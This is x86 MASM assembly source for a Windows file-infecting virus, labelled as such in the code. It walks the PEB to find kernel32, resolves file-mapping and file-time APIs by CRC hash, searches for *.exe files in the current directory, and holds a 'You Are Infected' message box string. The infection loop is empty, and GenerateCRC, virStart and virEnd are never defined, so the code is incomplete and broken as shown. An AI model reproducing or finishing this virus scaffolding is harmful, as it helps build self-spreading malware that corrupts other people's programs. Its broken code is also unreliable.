.586
.model flat,stdcall
option casemap:none

   include windows.inc
   include user32.inc
   include kernel32.inc
   include masm32.inc
   include masm32rt.inc
   
   includelib user32.lib
   includelib kernel32.lib
   includelib masm32.lib
   
.code
; -----------------------------------;
virusCode:
	pushad
	call delta
delta: 
	pop ebp
	mov eax,ebp
	sub ebp,delta

	assume fs:nothing
	mov ebx,[fs:48]
	mov ebx,[ebx+12]
	mov ebx,[ebx+20]
	mov ebx,[ebx]
	mov ebx,[ebx]
	mov ebx,[ebx+16]
	mov [ebp+dwKernelBase] , ebx
 
    	sub esp,68
    	mov ebx,esp
    	lea edi,[ebp+Kernel_APIs]
    	mov ecx,16
    	mov edx,[ebp+dwKernelBase]
    	push ebp
    	mov ebp,ebx
    	call GetAPIs
    	pop ebp
    	lea edx,[ebp+szUser32]
    	push edx
    	call [ebx+36]
    	mov edx,eax
    	lea edi,[ebp+User_APIs]
    	xor ecx,ecx
    	inc ecx
    	push ebp
    	lea ebp,[ebx+64]
    	call GetAPIs
    	pop ebp
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;   Infection routine : Infect all files in the current directory          ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
findFirstFile:
	sub esp,324
	push esp
	lea edx,[ebp+szExe]
	push edx
	call [ebx+16]
	inc eax
	jz endInfection
	dec eax
	mov dword ptr[esp+320],eax
findNextFile:
	;
endInfection:
	add esp,324
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                                    RetrieveAPIs                               ;
;  Parameters :  DLL base in edx , CRCs Offset in edi , No.of APIs in ecx , Offset to store at in ebp   ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
GetAPIs:
	push ebx
	push esi
	
	mov esi,edx
	add esi,[esi+3CH]
	mov esi,[esi+78H]
	add esi,edx
	push esi
	mov esi,[esi+20H]
	add esi,edx
	xor ebx,ebx
	cld 
	
	  looper:
        inc ebx
        lodsd
        add eax , edx       ;eax now points to the string of a function
        call GenerateCRC       ;eax now holds the hash of our function
        cmp dword [edi] , eax
        jne looper
        mov eax,[esp]
        mov eax,[eax+0x24]     ;RVA of EOT
        add eax,edx      ;VA of EOT
        movzx eax , word [(ebx-1)*2+eax]   ;eax now holds the ordinal of our function
        push esi
        mov esi,[esp+4]
        mov esi,[esi+0x1C]     ;RVA of EAT
        add esi,edx      ;VA of EAT
        mov esi,[eax*4+esi]
        add esi,edx
        mov [ebp] , esi     ;save address
        pop esi
        add edi,4
        add ebp,4
        dec ecx
        jnz looper
      pop esi
finished:
    pop esi
    pop ebx
    ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;              Data  ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
  szTitle 	 	db "Hello User",0
  szMsg  	 	db "~You Are Infected~",10,"Please remain Calm",10,"And Use Better AntiVirus",0
  szUser32   	db "User32.dll",0
  szExe	  	db "*.exe",0
  dwKernelBase 	dd 0
  virSize   	equ  virEnd - virStart
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;   APIs     ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Kernel_APIs:
  		    ACloseHandleA                          dd                                              4F6CEA0BH
                ACreateFileAA                          dd                                              0AAC4A387H
                ACreateFileMappingAA                   dd                                              4BE46D93H
                AExitProcessA                          dd                                              0DAEF6833H
                AFindFirstFileAA                       dd                                              036142A31H
                AFindNextFileAA                        dd                                              08AD8D6B7H
                AFlushViewOfFileA                      dd                                              068865B91H
                AGetFileAttributesAA                   dd                                              0CF9FE3E3H
                AGetFileTimeA                          dd                                              0C05002B5H
                ALoadLibraryAA                         dd                                              0C03E4272H
                AMapViewOfFileA                        dd                                              05764C7D0H
                ASetEndOfFileA                         dd                                              0DAE64EA5H
                ASetFileAttributesAA                   dd                                              0EA9468FDH
                ASetFilePointerA                       dd                                              01038158BH
                ASetFileTimeA                          dd                                              0DE7FB5FCH
                AUnmapViewOfFileA                      dd                                              0C6E54950H
        User_APIs:
                AMessageBoxAA                          dd                                              0A8D2A271H
end virusCode